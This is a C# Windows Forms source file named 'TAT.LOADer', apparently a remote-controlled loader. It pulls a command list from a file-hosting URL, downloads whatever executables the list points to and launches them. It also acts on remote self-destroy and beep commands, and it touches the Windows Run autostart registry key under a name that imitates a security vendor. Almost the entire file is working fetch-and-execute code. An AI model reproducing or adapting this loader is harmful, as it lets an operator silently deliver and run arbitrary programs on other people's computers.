using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

namespace TAT.LOADer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        //                      http://bayanbox.ir/download/8134258836503163473/ORDER

        private bool IIAA()
        {
            System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
            System.Net.NetworkInformation.PingReply pingStatus = ping.Send("bayanbox.ir");
            if (pingStatus.Status == System.Net.NetworkInformation.IPStatus.Success) { return true; } else { return false; }
        }

        WebClient webClient = new WebClient();
        WebClient webClient2 = new WebClient();
        string ORDERr = "EEE";

        private void Form1_Load(object sender, EventArgs e)
        {
            if (!(Directory.Exists(@"D:\TAT\T.S.2")))
            {
                Application.Exit();
                Console.Beep(1000, 10000);
            }
            if (IIAA())
            {
                if (!(File.Exists(@"D:\TAT\T.S.2\IIAA")))
                {
                    if (File.Exists(@"D:\TAT\T.S.2\L.exe"))
                        File.Delete(@"D:\TAT\T.S.2\L.exe");
                    bool CCC = true;
                    webClient.Encoding = Encoding.UTF8;
                    try
                    {
                        ORDERr = webClient.DownloadString("http://bayanbox.ir/download/8134258836503163473/ORDER");
                    }
                    catch { }
                    if (ORDERr == "NULL")
                        Application.Exit();

                    foreach (string ORDER in ORDERr.Split('\n'))
                    {
                        if (ORDER.StartsWith("http://"))
                        {
                            CCC = false;
                            try
                            {
                                webClient2.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                                webClient2.DownloadFileAsync(new Uri(ORDER), @"D:\TAT\T.S.2\L.exe");
                            }
                            catch { CCC = true; }
                        }
                        else
                        {
                            if (ORDER.StartsWith("SELF-DESTROY"))
                            {
                                registryKey.SetValue("ESET-t", "");
                                File.WriteAllText(@"D:\TAT\T.S.2\S.T.O.P", "");
                                Console.Beep(1000, 1000);
                            }
                            if (ORDER.StartsWith("BEEP,"))
                            {
                                string BORDER = ORDER.Replace("BEEP,", "");
                                string[] erq = new string[2];
                                erq = BORDER.Split(',');
                                int Frq = Convert.ToInt32(erq[0]);
                                int Dur = Convert.ToInt32(erq[1]);
                                Console.Beep(Frq, Dur);
                            }
                        }
                    }

                    if (CCC)
                        Application.Exit();
                }
                else { Console.Beep(700, 200); Console.Beep(700, 200); Console.Beep(700, 200); Console.Beep(700, 500); Application.Exit(); }
            }
            else
            { Console.Beep(700, 3000); Application.Exit(); }
        }

        private void Completed(object sender, AsyncCompletedEventArgs e)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
            startInfo.FileName = @"D:\TAT\T.S.2\L.exe";
            startInfo.Arguments = "";
            process.StartInfo = startInfo;
            process.Start();
            Application.Exit();
        }
    }
}
